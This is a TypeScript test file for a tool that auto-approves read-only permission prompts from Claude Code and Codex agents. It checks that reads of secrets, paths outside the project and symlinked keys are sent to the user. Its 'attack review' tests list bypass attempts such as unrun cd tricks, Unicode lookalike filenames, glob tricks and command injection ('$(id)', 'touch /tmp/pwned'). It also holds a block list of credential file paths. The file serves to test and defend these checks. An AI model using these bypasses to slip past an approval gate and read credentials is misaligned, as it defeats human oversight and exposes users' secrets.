      [["ls", "-la"], ["head"]],
    );
  });

  test("every other redirection, or one anywhere else, asks", () => {
    for (const [command, why] of [
      ["ls 2>/tmp/x", /redirection/],
      ["ls 2>x", /redirection/],
      ["ls 2>file 2>&1", /redirection/],
      ["ls >/dev/null", /redirection/],
      ["ls 1>/dev/null", /redirection/],
      ["ls &>/dev/null", /in the background/],
      ["ls >&/dev/null", /redirection/],
      ["ls 2>&1 >file", /redirection/],
      ["ls 2>&1 > /dev/null", /redirection/],
      ["ls >/dev/null 2>&1", /redirection/],
      ["ls 2>>/dev/null", /redirection/],
      ["ls 2>&2", /redirection/],
      ["ls 2>&-", /redirection/],
      ["ls 2>&1-", /redirection/],
      ['ls 2>"/dev/null"', /redirection/],
      ["ls 2>/dev/null'x'", /redirection/],
      ["ls 2>/dev/nullx", /redirection/],
      ["ls 2>/dev/null/x", /redirection/],
      ["ls 2>/dev/zero", /redirection/],
      ["ls 2 >/dev/null", /redirection/],
      ["ls x2>&1", /redirection/],
      ["ls 12>&1", /redirection/],
      ["ls 2>/dev/null 2>&1", /second redirection/],
      ["ls 2>/dev/null -la", /word after a redirection/],
      ["ls 2>/dev/null x", /word after a redirection/],
      ["ls 2>&1 'x'", /word after a redirection/],
      ["2>/dev/null ls", /no command/],
      ["ls | 2>/dev/null", /no command/],
      ["ls && 2>&1", /no command/],
      ["ls 2>&1&", /in the background/],
      ["ls 2>/dev/null &", /in the background/],
      ["ls 2>&1 |& cat", /\|&/],
      ["ls 2>&1 | tee x", /tee isn't a known reader/],
      ["ls 2>/dev/null; rm x", /rm isn't a known reader/],
      ["cat .env 2>/dev/null", /secret/],
      ["echo $'\\'' 2>/dev/null ; touch /tmp/pwned ; echo '\\''' 2>&1", /\$ expansion/],
      ["echo '2>/dev/null' $'x'", /\$ expansion/],
      ['echo "x" 2>&1 "$(id)"', /\$ expansion|word after/],
    ] as const) {
      const r = reads(command);
      assert.equal(r.readOnly, false, `${JSON.stringify(command)} should ask`);
      assert.match(r.why, why, `${JSON.stringify(command)}: ${r.why}`);
    }
  });
});

describe("auto-allow: other projects under ~/git", () => {
  // A fake home: its git/ with a clean project, one with secrets, links out and in, and a big one.
  const HOME = folder({ ".ssh/id_rsa": "KEY", "notes.txt": "", "Documents/x.md": "", "gitx/README.md": "" });
  const GIT = join(HOME, "git");
  folder({ "README.md": "", "src/a.ts": "", "docs/x.md": "" }, join(GIT, "clean"));
  folder({ "README.md": "", "src/a.ts": "", ".env": "KEY=1", "config/server.pem": "", "notes/x.md": "" }, join(GIT, "other"));
  symlinkSync(join(HOME, ".ssh/id_rsa"), join(GIT, "other/leak.txt"));
  symlinkSync(join(HOME, ".ssh"), join(GIT, "linked"));
  symlinkSync(join(GIT, "clean"), join(GIT, "inside-link"));
  const big = join(GIT, "big");
  mkdirSync(big);
  for (let i = 0; i < 5100; i++) writeFileSync(join(big, `f${i}.txt`), "");
  folder({ "config/secrets.yml": "", "prod.env": "" }, join(GIT, "other"));
  symlinkSync(join(HOME, ".ssh/id_rsa"), join(GIT, "other/notes\u{1F600}"));
  const proj = repo("[core]\n\tbare = false\n", { "README.md": "", ".env": "KEY=1" }, join(GIT, "proj"));
  symlinkSync(join(HOME, ".ssh/id_rsa"), join(proj, "notes"));
  // A repo whose remote's URL has a token in it.
  const cred = repo('[remote "origin"]\n\turl = https://me:ghp_x@github.com/me/x.git\n', { "README.md": "" }, join(GIT, "cred"));
  const scratch = folder({ "a.txt": "" }, join(HOME, "scratch/s1"));
  const home = { home: HOME };
  const at = (command: string, cwd = proj) => commandReadOnly(command, cwd, home);
  const tool = (name: string, input: Record<string, unknown>, cwd = proj) => readOnlyCall(name, input, cwd, home);

  test("reads there are allowed, from a project, a scratch folder or the home folder", () => {
    for (const cwd of [proj, scratch, HOME])
      for (const command of [
        "cat ~/git/clean/README.md",
        `cat ${GIT}/clean/README.md`,
        "head -5 ~/git/other/README.md 2>/dev/null",
        "ls ~/git",
        "ls -la ~/git/other/src",
        "wc -l ~/git/clean/src/a.ts ~/git/other/src/a.ts",
        "grep -rn TODO ~/git/clean",
        "rg TODO ~/git/clean",
        "rg -l TODO ~/git/other/src",
        "find ~/git/other -name '*.ts'",
        "cd ~/git/clean && cat README.md && ls src",
        `cd ${GIT}/clean && grep -rn TODO .`,
        "test -d ~/git/clean && echo yes",
        "ls ~/git/other/notes/*.md",
      ])
        assert.equal(at(command, cwd).readOnly, true, `${cwd}: ${command}: ${at(command, cwd).why}`);
    for (const [name, input] of [
      ["Read", { file_path: join(GIT, "clean/README.md") }],
      ["Grep", { pattern: "x", path: join(GIT, "clean") }],
      ["Glob", { pattern: "**/*.ts", path: join(GIT, "other") }],
      ["LS", { path: GIT }],
    ] as const)
      for (const cwd of [proj, scratch, HOME]) assert.equal(tool(name, input, cwd).readOnly, true, `${cwd}: ${name} ${JSON.stringify(input)}: ${tool(name, input, cwd).why}`);
  });

  test("the home folder, .. out of ~/git, links, secrets, a folder too big to check, git elsewhere: ask", () => {
    for (const [command, why] of [
      ["cat ~/git/../.ssh/id_rsa", /\.\. in it/],
      ["ls ~/git/..", /\.\. in it/],
      ["cat ../other/README.md", /\.\. in it/],
      ["cat ~/.ssh/id_rsa", /outside the project/],
      ["ls ~", /outside the project/],
      ["cat ~/notes.txt", /outside the project/],
      ["cat ~/gitx/README.md", /outside the project/],
      [`cat ${HOME}/Documents/x.md`, /outside the project/],
      ["cat ~/git/other/.env", /secret/],
      [`cat ${GIT}/other/.env`, /secret/],
      ["cat ~/git/other/config/server.pem", /secret/],
      ["cat ~/git/other/leak.txt", /a link/],
      ["cat ~/git/linked/id_rsa", /a link/],
      ["ls ~/git/linked", /a link/],
      ["cat ~/git/inside-link/README.md", /a link/],
      ["cd ~/git/linked && cat id_rsa", /a link/],
      ["grep -r KEY ~/git/other", /a secret in it \(other\/\.env/],
      ["rg KEY ~/git/other", /a secret in it \(other\/config/],
      ["grep -rn x ~/git/big", /too big/],
      ["grep -rn x ~/git", /too big|a secret in it/],
      ["rg x ~/git", /too big|a secret in it/],
      ["git -C ~/git/other status", /git -C/],
      ["cd ~/git/clean && git status", /git after a cd/],
      ["git log -- ~/git/clean/README.md", /outside the project/],
      ["git show HEAD:../other/.env", /\.\. in it|secret/],
      ["cd ~/git/clean && cat ../other/.env", /\.\. in it/],
      ["ls ~/git/*/README.md", /folder's name/],
      ["cat ~/git/other/*", /secret|a link/],
      ["cat ~/*", /outside the project/],
    ] as const) {
      const r = at(command);
      assert.equal(r.readOnly, false, `${command} should ask`);
      assert.match(r.why, why, `${command}: ${r.why}`);
    }
    for (const [name, input, why] of [
      ["Read", { file_path: join(GIT, "other/.env") }, /secret/],
      ["Read", { file_path: join(GIT, "other/leak.txt") }, /a link/],
      ["Read", { file_path: `${GIT}/../.ssh/id_rsa` }, /\.\. in it/],
      ["Read", { file_path: join(HOME, ".ssh/id_rsa") }, /outside the project/],
      ["Read", { file_path: join(HOME, "notes.txt") }, /outside the project/],
      ["Grep", { pattern: "KEY", path: join(GIT, "other") }, /a secret in it/],
      ["Grep", { pattern: "x", path: join(GIT, "big") }, /too big/],
      ["LS", { path: HOME }, /outside the project/],
      ["Glob", { pattern: `${GIT}/**/*.ts` }, /outside the project/],
    ] as const) {
      const r = tool(name, input);
      assert.equal(r.readOnly, false, `${name} ${JSON.stringify(input)} should ask`);
      assert.match(r.why, why, `${name} ${JSON.stringify(input)}: ${r.why}`);
    }
    // With the session's folder unknown: no absolute or ~ path at all, ~/git's neither.
    assert.match(commandReadOnly("cat ~/git/clean/README.md", undefined, home).why, /outside the project/);
  });

  test("a cd that would fail (a folder it can't enter) asks: after `;` the next command would read where it was", () => {
    const locked = join(GIT, "clean/locked");
    mkdirSync(locked, { mode: 0o000 });
    try {
      assert.match(at("cd ~/git/clean/locked; cat README.md").why, /can't be entered/);
      assert.match(at("cd ./locked; ls", join(GIT, "clean")).why, /can't be entered/);
    } finally {
      chmodSync(locked, 0o700); // the test folder's cleanup can go in
    }
  });

  test("the attack review of the loosening: each of its bypasses asks", () => {
    for (const [command, why, cwd] of [
      // 1. A cd the shell never runs (or whose folder the next command doesn't run in) moved the checks.
      ["false && cd ~/git/other; cat notes", /after a cd/, proj],
      ["true || cd ~/git/other; cat notes", /after a cd/, proj],
      ["cd ~/git/other | cat notes", /after a cd/, proj],
      ["cd ~/git/other || cat notes", /after a cd/, proj],
      ["cd ~/git/other; cat notes", /after a cd/, proj],
      ["false && cd ~/git/clean; grep -r FAKE .", /after a cd/, proj],
      ["false && cd ~/git/other; cat *", /after a cd/, proj],
      ["cd ~/git/clean && ls || cat notes", /after a cd/, proj],
      ["ls | cd ~/git/clean && cat README.md", /after a cd/, proj],
      ["false && cd ~/git/clean; grep -r AKIA .", /after a cd/, HOME],
      ["false && cd ~/git/clean; head -100 notes.txt", /after a cd/, HOME],
      ["false && cd ~/git/clean; ls -laR", /after a cd/, HOME],
      ["false && cd ~/git/clean; find . -name '*.pem'", /after a cd/, HOME],
      // 3. Letters APFS reads as others (the Kelvin sign as k, the long s as s).
      ["cat 'config/master.\u212Aey'", /character it doesn't read/, proj],
      [`cat "${GIT}/other/.aw\u017F/credential\u017F"`, /character it doesn't read/, proj],
      // 4. ? is one character to the shell, two UTF-16 units here: a link named notes😀.
      ["cat ~/git/other/notes?", /character it doesn't read|a link/, proj],
      ["cat ~/git/other/notes????", /character it doesn't read|a link/, proj],
      // 5. A file filter doesn't skip the look for secrets (secrets.yml, a .git/config with a token).
      ["grep -r --include='*.yml' x ~/git/other", /a secret in it/, proj],
      ["rg -g '*.yml' x ~/git/other", /a secret in it/, proj],
      ["grep -r --include=config url ~/git/cred", /a secret in it \(cred\/\.git\/config/, proj],
      ["rg -g config --hidden url ~/git/cred", /a secret in it/, proj],
      ["grep -r url ~/git/cred", /a secret in it/, proj],
      // 6. Secrets that weren't on the list.
      ["cat ~/git/cred/.git/config", /a credential in it/, proj],
      ["cat ~/git/other/prod.env", /secret/, proj],
      ["git remote -v", /holds a credential/, cred],
      ["git remote get-url origin", /holds a credential/, cred],
      ["git config --get remote.origin.url", /holds a credential/, cred],
      // 7. bash 3.2's .? and .* pick . and ..
      ["ls -R ~/git/.?", /picks \. or \.\./, proj],
      ["ls -la .*", /picks \. or \.\./, proj],
    ] as const) {
      const r = at(command, cwd);
      assert.equal(r.readOnly, false, `${command} should ask`);
      assert.match(r.why, why, `${command}: ${r.why}`);
    }
    // 2. A tool's ~ and ~/ are the home folder (Claude Code expands them); ~user asks.
    for (const [name, input, why] of [
      ["Grep", { pattern: "AKIA", path: "~" }, /outside the project/],
      ["Read", { file_path: "~/notes.txt" }, /outside the project/],
      ["Read", { file_path: "~/.ssh/id_rsa" }, /outside the project/],
      ["Glob", { pattern: "**/*", path: "~" }, /outside the project/],
      ["LS", { path: "~/" }, /outside the project/],
      ["Read", { file_path: "~root/x" }, /outside the project/],
      ["Read", { file_path: join(GIT, "other/config/master.\u212Aey") }, /character it doesn't read/],
      ["Grep", { pattern: "x", path: join(GIT, "other"), glob: "*.yml" }, /a secret in it/],
      ["Grep", { pattern: "url", path: join(GIT, "cred"), glob: "config" }, /a secret in it/],
    ] as const) {
      const r = tool(name, input);
      assert.equal(r.readOnly, false, `${name} ${JSON.stringify(input)} should ask`);
      assert.match(r.why, why, `${name} ${JSON.stringify(input)}: ${r.why}`);
    }
    // What the fixes leave allowed: a cd that surely ran, a filter that picks no secret, a tool's ~/git.
    for (const command of ["cd ~/git/clean && cat README.md | head -3 && ls src", "grep -r --include='*.ts' x ~/git/other", "rg -g '*.{ts,md}' x ~/git/other"])
      assert.equal(at(command).readOnly, true, `${command}: ${at(command).why}`);
    assert.equal(tool("Read", { file_path: "~/git/clean/README.md" }).readOnly, true);
    assert.equal(at("git remote -v", proj).readOnly, true, at("git remote -v", proj).why);
    // A name the glob picks that starts with -, in any letters (-😀): asks.
    const dash = folder({ "-\u{1F600}": "", ab: "" });
    assert.match(commandReadOnly("cat ??", dash, home).why, /starting with -/);
  });

  test("the attack review's second round: each asks", () => {
    // B, C: a credential in any file named config, any case: a bare repo's, a submodule's, a worktree's.
    const url = '[remote "origin"]\n\turl = https://u:TOKEN@github.com/me/x.git\n';
    folder({ HEAD: "ref: refs/heads/main\n", config: url, objects: null, refs: null }, join(GIT, "bare.git"));
    repo("[core]\n\tbare = false\n", { ".git/modules/lib/config": url, "README.md": "" }, join(GIT, "sub"));
    repo("[core]\n\tbare = false\n", { ".git/worktrees/w/config.worktree": url, "README.md": "" }, join(GIT, "wt"));
    // D: a secret's folder, whatever a filter picks.
    folder({ ".kube/config": "token: x", "README.md": "" }, join(GIT, "kube"));
    folder({ ".docker/config.json": "{}", "README.md": "" }, join(GIT, "dock"));
    for (const [command, why] of [
      ["cat ~/git/cred/.GIT/config", /a credential in it/],
      ["cat ~/git/cred/.git/CONFIG", /a credential in it/],
      ["cat ~/git/cred/.Git/Config", /a credential in it/],
      ["cat ~/git/bare.git/config", /a credential in it/],
      ["grep -r url ~/git/bare.git", /a secret in it/],
      ["grep -r url ~/git/sub", /a secret in it \(sub\/\.git\/modules\/lib\/config/],
      ["rg --hidden url ~/git/sub", /a secret in it/],
      ["grep -r url ~/git/wt", /a secret in it \(wt\/\.git\/worktrees/],
      ["grep -r --include=config token ~/git/kube", /a secret in it \(kube\/\.kube/],
      ["rg --hidden -g config token ~/git/kube", /a secret in it/],
      ["rg --hidden -g config.json auth ~/git/dock", /a secret in it/],
      ["grep -r --include=config.json auth ~/git/dock", /a secret in it/],
    ] as const) {
      const r = at(command);
      assert.equal(r.readOnly, false, `${command} should ask`);
      assert.match(r.why, why, `${command}: ${r.why}`);
    }
    for (const [name, input, why] of [
      // A: Claude Code trims a path (and then reads its ~).
      ["Read", { file_path: " ~/notes.txt" }, /outside the project/],
      ["Read", { file_path: ` ${HOME}/notes.txt` }, /outside the project/],
      ["Grep", { pattern: "AKIA", path: " ~" }, /outside the project/],
      ["LS", { path: `${HOME} ` }, /outside the project/],
      ["Glob", { pattern: " /etc/*" }, /outside the project/],
      ["Grep", { pattern: "x", path: join(GIT, "sub") }, /a secret in it/],
      ["Grep", { pattern: "token", path: join(GIT, "kube"), glob: "config" }, /a secret in it/],
    ] as const) {
      const r = tool(name, input);
      assert.equal(r.readOnly, false, `${name} ${JSON.stringify(input)} should ask`);
      assert.match(r.why, why, `${name} ${JSON.stringify(input)}: ${r.why}`);
    }
    // E: a global config that includes another (unread, it could rewrite URLs with a token in them).
    const h4 = folder({ ".gitconfig": "[include]\n\tpath = ~/.gitconfig-work\n" });
    assert.match(commandReadOnly("git remote -v", proj, { home: h4 }).why, /includes another/);
    assert.equal(commandReadOnly("git log --oneline -3", proj, { home: h4 }).readOnly, true);
  });

  test("a ~/git that is a link to the home folder (or holds it) isn't one", () => {
    const h2 = folder({ "notes.txt": "", "x/README.md": "" });
    symlinkSync(h2, join(h2, "git"));
    assert.match(commandReadOnly("cat ~/git/notes.txt", scratch, { home: h2 }).why, /outside the project/);
    const h3 = folder({ "notes.txt": "" });
    assert.match(commandReadOnly("cat ~/git/x", scratch, { home: h3 }).why, /outside the project/, "no ~/git");
  });
});

describe("auto-allow: globs as ls, cat, head and wc's files", () => {
  const G = folder({ "README.md": "", "CHANGES.md": "", "src/a.ts": "", "src/b.ts": "", "src/lib/c.ts": "", "docs/x.txt": "", ".env.example": "" });
  test("each match a path allowed on its own: allowed", () => {
    for (const command of [
      "ls *.md",
      "cat *.md",
      "head -5 src/*.ts",
      "wc -l src/*.ts | tail -1",
      "ls -la src/*",
      "ls docs/*.md 2>/dev/null",
      "cat ?EADME.md",
      "ls *",
      "cat *.md *.txt",
      "ls ./src/*.ts",
    ])
      assert.equal(reads(command, G).readOnly, true, `${command}: ${reads(command, G).why}`);
    assert.equal(lex("ls *.md").commands?.[0][1].glob, true);
    assert.equal(lex("ls '*.md'").commands?.[0][1].glob, false);
  });

  test("anywhere else, of any other form, or picking a flag, a link or a secret: asks", () => {
    for (const [command, why] of [
      ["rg foo *.md", /a glob/],
      ["grep x *.md", /a glob/],
      ["grep -r x src/*", /a glob/],
      ["find *.md", /a glob/],
      ["find . -name *.md", /a glob/],
      ["git diff *.md", /a glob/],
      ["git log -- *.md", /a glob/],
      ["sed -n 1p *.md", /a glob/],
      ["file *", /a glob/],
      ["tail *.md", /a glob/],
      ["stat *.md", /a glob/],
      ["echo *", /a glob/],
      ["printf %s *", /a glob/],
      ["jq . *.json", /a glob/],
      ["cd *", /a glob/],
      ["l* -la", /isn't a known reader/],
      ["ls -*", /a glob/],
      ["ls --color=*", /a glob/],
      ["head -n * x", /head -n|a glob/],
      ["ls src/*/c.ts", /folder's name/],
      ["ls **/*.ts", /folder's name/],
      ["ls src/**", /doesn't read/],
      ["ls *.[tj]s", /a glob/],
      ["ls *(.)", /brackets/],
      ["ls *x~1", /doesn't read/],
      ["ls '*'*.md", /quotes/],
      ['ls "src"/*.ts', /quotes/],
      ["cat ../*.md", /\.\. in it/],
      ["cat /etc/*", /outside the project/],
      ["ls nowhere/*.md", /can't read/],
    ] as const) {
      const r = reads(command, G);
      assert.equal(r.readOnly, false, `${command} should ask`);
      assert.match(r.why, why, `${command}: ${r.why}`);
    }
    // PROJECT: names that are flags, secrets and links out.
    assert.match(reads("ls *").why, /starting with -/);
    assert.match(reads("cat config/*").why, /secret/);
    assert.match(reads("cat docs/*").why, /a link/);
    assert.match(reads("ls e*").why, /a link/);
    assert.match(reads("cat .e*").why, /secret/);
    // With the session's folder unknown, or the home folder: asks.
    assert.match(commandReadOnly("cat *.md", undefined).why, /unknown|outside/);
    assert.match(reads("cat *.md", homedir()).why, /home folder/);
  });
});

describe("auto-allow: secrets", () => {
  test("a secret's path, never words that only look like one", () => {
    assert.equal(secretIn("~/.ssh/config"), "~/.ssh/config");
    assert.equal(secretIn(".env.prod"), ".env.prod");
    assert.equal(secretIn("~/Library/Keychains"), "~/Library/Keychains");
    for (const p of [
      ".codex/auth.json",
      ".claude/.credentials.json",
      ".claude.json",
      ".terraform.d/credentials.tfrc.json",
      ".yarnrc.yml",
      "Chrome/Default/Cookies",
      "Chrome/Default/Login Data",
      ".config/kiko/settings.json",
      ".wrangler/config/default.toml",
      ".config/fly/config.yml",
      ".docker/config.json",
      ".kube/config",
      ".gnupg/x",
      ".netrc",
      ".npmrc",
      ".pypirc",
      ".aws/credentials",
      "x/id_ecdsa_sk",
      "a.key",
      "a.p12",
      ".zsh_history",
      ".config/gh/hosts.yml",
      "service-account-x.json",
      "prod.tfvars",
      ".dev.vars",
      "kubeconfig",
      "github.token",
      "token.json",
      "firebase-adminsdk-x.json",
      "secrets.yaml",
      "credentials",
      "prod.env",
      ".mcp.json",
      ".claude/settings.local.json",
      "config/database.yml",
      "android/local.properties",
      "config/master.\u212Aey",
      ".aws/credential\u017F",
    ])
      assert.ok(secretIn(p), p);
    for (const p of ["src/env.ts", "README.md", "keyboard.ts", "docs/history.md", "credentialing.md", "src/secret.ts", "credentials.md", ".env.example", ".env.sample"])
      assert.equal(secretIn(p), null, p);
  });
});

describe("auto-allow: other tools", () => {
  const call = (name: string, input: Record<string, unknown>, cwd: string | undefined = PROJECT) => readOnlyCall(name, input, cwd);

  test("Read, Grep, Glob and LS inside the session's folder only read", () => {
    for (const [name, input] of [
      ["Read", { file_path: join(PROJECT, "README.md") }],
      ["Read", { file_path: "src/main.ts" }],
      ["Grep", { pattern: "API_KEY", path: join(PROJECT, "src") }],
      ["Grep", { pattern: "x", glob: "*.ts" }],
      ["Grep", { pattern: "x", glob: "**/*.{ts,tsx}" }],
      ["Glob", { pattern: "**/*.md" }],
      ["Glob", { pattern: "src/**/*.ts", path: PROJECT }],
      ["LS", { path: join(PROJECT, "docs") }],
    ] as const)
      assert.equal(call(name, input).readOnly, true, `${name} ${JSON.stringify(input)}: ${call(name, input).why}`);
    // Grep with no glob reads every file under its path: fine where none is a secret's.
    assert.equal(call("Grep", { pattern: "API_KEY" }, CLEAN).readOnly, true, call("Grep", { pattern: "API_KEY" }, CLEAN).why);
  });

  test("outside it, a link out of it, a secret, or a glob that could pick one: asks", () => {
    for (const [name, input, why] of [
      ["Read", { file_path: "/Users/me/Documents/site/README.md" }, /outside the project/],
      ["Read", { file_path: join(OUTSIDE, "notes.md") }, /outside the project/],
      ["Read", { file_path: join(PROJECT, "docs/leak.txt") }, /a link/],
      ["Read", { file_path: join(PROJECT, ".env") }, /secret/],
      ["Read", { file_path: join(homedir(), ".ssh/id_rsa") }, /outside the project/],
      ["Read", { file_path: `${PROJECT}/../x` }, /\.\. in it/],
      ["Read", {}, /no file/],
      ["Read", { file_path: "/Users/someone/.s?h/id_rsa" }, /outside the project/],
      ["Grep", { pattern: "x", path: "/Users/someone/." }, /outside the project/],
      ["Grep", { pattern: "x", path: "/Users/someone//" }, /outside the project/],
      ["Grep", { pattern: "PRIVATE KEY", path: PROJECT, glob: "**/.ssh/*" }, /secret/],
      ["Grep", { pattern: "x", glob: "*.pem" }, /secret/],
      ["Grep", { pattern: "x", glob: "*" }, /could pick a secret|a secret in it/],
      ["Grep", { pattern: "x", glob: "**/c?edentials" }, /could pick a secret/],
      ["Glob", { pattern: "**/.env*" }, /secret/],
      ["Glob", { pattern: "**/id_*", path: PROJECT }, /secret/],
      ["Glob", { pattern: "../**/*.ts" }, /outside the project/],
      ["Glob", { pattern: "/Users/someone/**" }, /outside the project/],
      ["Glob", { pattern: "**/*", path: "/Users/someone/." }, /outside the project/],
      ["LS", { path: "/etc" }, /outside the project/],
      ["Grep", { pattern: "KEY" }, /a secret in it/],
      ["Read", { file_path: `${PROJECT}/elsewhere/../README.md` }, /\.\. in it/],
    ] as const) {
      const r = call(name, input);
      assert.equal(r.readOnly, false, `${name} ${JSON.stringify(input)}`);
      assert.match(r.why, why, `${name} ${JSON.stringify(input)}: ${r.why}`);
    }
    assert.match(readOnlyCall("Read", { file_path: join(PROJECT, "README.md") }).why, /folder is unknown/);
    assert.match(call("Grep", { pattern: "token" }, homedir()).why, /home folder/);
  });

  test("every other tool asks", () => {
    for (const [name, input] of [
      ["Edit", { file_path: "a.ts" }],
      ["Write", { file_path: "a.ts" }],
      ["WebFetch", { url: "https://kiko.sh" }],
      ["WebSearch", { query: "kiko" }],
      ["mcp__github__get_issue", {}],
      ["Agent", { prompt: "look around" }],
      ["", {}],
    ] as const)
      assert.equal(readOnlyCall(name, input, PROJECT).readOnly, false, name);
  });
});

/** A held prompt as Claude Code's and Codex's hooks hold one, keeping what it was answered. */
class Claude extends HookHeld {
  sent: Record<string, unknown> | null = null;
  get open() {
    return this.sent === null;
  }
  protected send(payload: Record<string, unknown>) {
    if (this.sent) return false;
    this.sent = payload;
    return true;
  }
}
class Codex extends CodexHeld {
  get open() {
    return true;
  }
  protected send() {
    return true;
  }
}
const claude = (tool_name: string, tool_input: Record<string, unknown>, extra: Partial<HookEvent> = {}): HookEvent => ({
  hook_event_name: "PermissionRequest",
  session_id: "s1",
  cwd: "/Users/me/git/kiko",
  permission_mode: "acceptEdits",
  tool_name,
  tool_input,
  ...extra,
});

describe("auto-allow: which prompts Kiko answers itself", () => {
  test("Claude Code's and Codex's read-only prompts: what and why, paths checked against the session's folder", () => {
    const skipped: string[] = [];
    assert.deepEqual(
      readOnlyAllowed(new Claude(claude("Bash", { command: "git log --oneline -3" })), (w) => skipped.push(w)),
      { what: "git log --oneline -3", why: "git log" },
    );
    const codex: CodexEvent = { agent: "codex", hook_event_name: "PermissionRequest", session_id: "c1", cwd: "/x", tool_name: "Bash", tool_input: { command: "ls -la" } };
    assert.deepEqual(readOnlyAllowed(new Codex(codex)), { what: "ls -la", why: "ls" });
    assert.deepEqual(readOnlyAllowed(new Claude(claude("Read", { file_path: "/Users/me/git/kiko/README.md" }))), { what: "read /Users/me/git/kiko/README.md", why: "read" });
    assert.equal(skipped.length, 0);
    assert.equal(
      readOnlyAllowed(new Claude(claude("Read", { file_path: "/Users/me/Documents/site/README.md" })), (w) => skipped.push(w)),
      null,
    );
    assert.deepEqual(skipped, ["a path outside the project (/Users/me/Documents/site/README.md)"]);
  });

  test("one that doesn't only read is asked, with why told for the log", () => {
    const skipped: string[] = [];
    assert.equal(
      readOnlyAllowed(new Claude(claude("Bash", { command: "git push" })), (w) => skipped.push(w)),
      null,
    );
    assert.deepEqual(skipped, ["git push"]);
  });

  test("never one the safety gate asked, a quick check's, Claude's questions, or another tool", () => {
    const command = "git status";
    noteGuard(
      { agent: "claude-code", sessionId: "s1", cwd: "/x", tool: { name: "Bash", input: { command } }, hits: [], unclear: [] },
      { ask: true, kind: "sends", rule: "r", what: "send", by: "rule", reason: "asks" },
    );
    const skipped: string[] = [];
    assert.equal(
      readOnlyAllowed(new Claude(claude("Bash", { command })), (w) => skipped.push(w)),
      null,
    );
    assert.deepEqual(skipped, ["the safety gate asked it"]);
    forgetPending();
    assert.equal(readOnlyAllowed(new Claude(claude("Bash", { command: "ls" }, { session_id: QUICK_CHECK_ID }))), null);
    const questions = { questions: [{ question: "Which?", header: "Pick", options: [{ label: "A" }, { label: "B" }], multiSelect: false }] };
    assert.equal(readOnlyAllowed(new Claude(claude("AskUserQuestion", questions))), null);
    assert.equal(readOnlyAllowed(new Claude(claude("Edit", { file_path: "a.ts" }))), null);
    assert.equal(readOnlyAllowed(new Claude(claude("WebFetch", { url: "https://kiko.sh" }))), null);
  });

  test("only Claude Code's and Codex's: another agent's prompt, or one Kiko made, is asked", () => {
    const inner = new Claude(claude("Bash", { command: "ls" }));
    const other = {
      sessionId: "o1",
      cwd: "/x",
      isPermission: true,
      open: true,
      desktop: false,
      text: "",
      continued: false,
      tool: { name: "Bash", input: { command: "ls" } },
      canAllowAlways: true,
      questions: null,
      onClosed: () => {},
      lastAsked: () => "",
      saidThisTurn: () => null,
      watchTyped: () => {},
      answer: () => false,
      allow: () => inner.allow(false),
      deny: () => false,
      answerQuestions: () => false,
      release: () => false,
    };
    assert.equal(readOnlyAllowed(other), null, "no agent said");
    assert.equal(readOnlyAllowed({ ...other, agent: "opencode" }), null);
    assert.equal(inner.sent, null);
  });

  test("allowed once: never with Claude Code's 'don't ask again' rules", () => {
    const suggestions = [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "git log *" }], behavior: "allow", destination: "localSettings" }];
    const held = new Claude(claude("Bash", { command: "git log -1" }, { permission_suggestions: suggestions }));
    assert.ok(readOnlyAllowed(held));
    // What announce.ts allowReadOnly sends: allow(false).
    held.allow(false);
    assert.deepEqual(held.sent, { decision: { behavior: "allow" } });
  });
});
